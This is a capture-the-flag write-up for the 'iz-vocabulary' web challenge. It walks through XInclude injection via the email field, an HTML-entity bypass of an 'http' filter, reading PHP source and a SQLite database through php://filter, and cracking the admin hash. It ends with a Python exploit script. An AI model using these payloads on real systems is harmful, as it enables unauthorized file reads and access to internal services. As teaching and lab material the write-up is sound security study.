# iz-vocabulary

# Overview

This is a website that supports learning English vocabulary with flashcards. You need to register for an account on this site to start learning. The system will show the words on the front of the card and its meaning as well as illustrations on the back of the card. The system will let you learn some words for free. To learn more words, you need to upgrade your account.

![Word is written on the front of the card](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled.png)

Word is written on the front of the card

![Meaning of words and illustrations are written on the back of the card](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%201.png)

Meaning of words and illustrations are written on the back of the card

# Features of the site

After walking around the site, we can list its features as follows:

- Register an account on the site at `/register.php`
- Login / Log out an account at `/login.php` / `/logout.php`
- Upgrade your account at `/upgrade.php`
- View your account information at `/setting.php`
- Download your account information at `/info.php`
- Update your account information at `POST /setting.php`

# Find entry points

After having an overview of the site and its features. We need to figure out which inputs we can control. Here are some obvious inputs:

- `Username` and `Password` at `/login.php`
- `Username`, `Password`, `Email` and `Phone` at `/register.php`
- `Email`, `Phone number` at `/setting.php`

This is a blackbox challenge, you don’t have the server's source code. So one solution is to try special values on the above inputs and then observe the results returned. The problem here is what values to try? Therefore we need to look for something unusual on the web page to narrow down the range of values to try on the inputs.

# Find something unusual

![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%202.png)

If you pay close attention, in `Download your account information` feature, your information will be returned as XML.

![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%203.png)

Looking at this XML file, we can guess the information:

- `username`: Your username
- `password`: Some kind of hash of your password, maybe MD5
- `type`: Showing as `normal`, maybe this is your account type. If you upgrade, it will become `vip` or something like that
- `email`: Your email
- `phone`: Your phone

This feature is unusual because it allows you to download a backup copy of your account information, but why an XML file and what is this file then used for? Maybe this feature is a hint: 

<aside>
💡 The information of each account is stored on the server as an XML file.

</aside>

# **Identify the vulnerability**

If the server stores each account's information in an XML file, each time you access `/setting.php` to view the account's information, the server will read that XML file and parse it into an object that can be retrieved data.

Parsing XML can lead to a classic security flaw, called XXE Injection. In this vulnerability, you will inject XML External Entities into the XML file and the parsers will process these entities during the parsing process. These entities, after being parsed, can be replaced with the content of a certain file on the system, leading to the vulnerability of reading any file on the system. You can read more about this vulnerability at [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe).

Reading this far you can think of injecting XML External Entity into an account's XML file thanks to the account information update feature at `POST /setting.php`. Then take advantage of these entities to read the source code of the files on the server.

# But it's not that simple …

Let's take a look at what you can control in the XML file. That is `<username>`, `<email>` and `<phone>`. Note that you cannot control `<password>` because this value is already hashed. The common feature of the values you control is that they are not at the top of the XML file. Whereas to declare an XML External Entity, you need to put it inside `<!DOCTYPE>` and this tag can only be placed right after the line `<?xml version="1.0" encoding="UTF-8"? >`. So we can't insert XML External Entity, which means we can't read an arbitrary file. Looks like we're stuck …

![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%204.png)

# XInclude

However, if you dig deeper into XML, you will find the `<xi:include>` tag, which will access another XML file via a URL and include that file in the current file. You can read more about it at [https://www.w3.org/TR/xinclude-11/](https://www.w3.org/TR/xinclude-11/). The structure of `<xi:include>` is:

`<xi:include xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)" href="[http://your-url-go-here](http://your-url-go-here/)" parse="text"></xi:include>`

So to read any file on the server, you simply need a URL to that file via scheme `php://` because server written in PHP. For example, if I want to read base64 content of the `index.php` file, I will do the following:

- Access the feature `Update your information`
- Change `Email` to `<xi:include xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)" href="``php://filter/convert.base64-encode/resource=index.php" parse="text"></xi:include>`
- Click `Update information`

After the information has been updated, the base64 content of the index.php file will be displayed in `<email>` when you view the account information at `/setting.php`.

# Firewall on server

But then you will realize that there is a firewall on the server, if the input contains `http` or `https` (case insensitive) you will not be updated. The `<xi:include>` payload requires `xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)"` part to work, so we were stopped.

So how to bypass this firewall? One idea is that we need a payload that doesn't contain `http` but after XML parsing, it will contain `http`. This makes me think of XML entity. If we define an XML Entity `ent` with the value `h`, then instead of writing `http` we can write it as `&ent;ttp` and bypass the firewall.

But as I showed above, we cannot define a new entity. Fortunately, XML has several entities available, for example an entity with a value of `h` would be `&#104;` (104 is ASCII value of character `h`). So the payload will now have the form:

`<xi:include xmlns:xi="&#104;[ttp://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)" href="php://filter/convert.base64-encode/resource=index.php" parse="text"></xi:include>`

Now I can read base64 content of `index.php`

![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%205.png)

# Find Flag

Once you have the entire source code, look at the file `index.php`

![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%206.png)

It looks like there is an API called `http://iz-vocabulary-api:8080` on the server, and the `/debug` endpoint of this API might give us more information. However this is an internal API, you can think of using XXE to access it. But to call the `/debug` API, we need a request with a POST method, which XXE cannot do. So in order to call this endpoint, we need to be able to log into the account `admin`.

Since we can read any file on the server, we will read the XML file containing the `admin` account information. However, we do not know the name of this file. So we read the source file `register.php` to understand how to name the XML file when creating a new account.

![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%207.png)

In line 35, the name of the XML file contains random strings so we can't guess. Next in line 50, information about the name of the XML file corresponding to the newly created account will be inserted into the SQLite database. The database file is located on the server itself, so we only need to use XXE to read this file to get the XML file name of the `admin` account. Now we have the hash of the `admin` account password. Crack this hash by scanning on CrackStation, we get the password is `il0v3you`.

Now we can access the `admin` account and go to the `/debug` endpoint of the API. This endpoint has the effect of printing the source code of the API. Reading this source code, we see that there is an endpoint `/flag2` that will give us a flag.

![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%208.png)

To call the endpoint `/flag2`, we use XXE similar to how we read the file on the server with payload `<xi:include xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)" href="[http://iz-vocabulary-api:8080/flag2](http://iz-vocabulary-api:8080/flag2)" parse="text"></xi:include>` and get the flag.

![Untitled](iz-vocabulary%20a0dee69ff9a945e199872b9af692da3b/Untitled%209.png)

# Exploit code

```python
import requests
import secrets
import time
import re

URL = 'http://127.0.0.1:8000'

s = requests.Session()

def random_user():
    return {
        'username': secrets.token_hex(5),
        'password': secrets.token_hex(50),
        'email': 'haha',
        'phone': 'hihi',
    }

def register(user):
    time.sleep(1)
    s.post(URL + '/register.php', data={
        'username': user['username'],
        'password': user['password'],
        'email': user['email'],
        'phone': user['phone'],
    })

def login(user):
    time.sleep(1)
    s.post(URL + '/login.php', data={
        'username': user['username'],
        'password': user['password'],
    })

def get_flag():
    resp = s.post(URL + '/setting.php', data={
        'email': '<xi:include xmlns:xi="&#104;ttp://www.w3.org/2001/XInclude" href="&#104;ttp://iz-vocabulary-api:8080/flag2" parse="text"></xi:include>',
        'phone': 'hehe'
    }).text
    re_res = re.findall(r'HCMUS-CTF{(.*)}', resp)
    if len(re_res) > 0:
        for flag in re_res:
            print("[+] flag: HCMUS-CTF{" + flag + "}")

user = random_user()

print('[+] register user')
register(user)

print('[+] login')
login(user)

print('[+] get flag')
get_flag()
```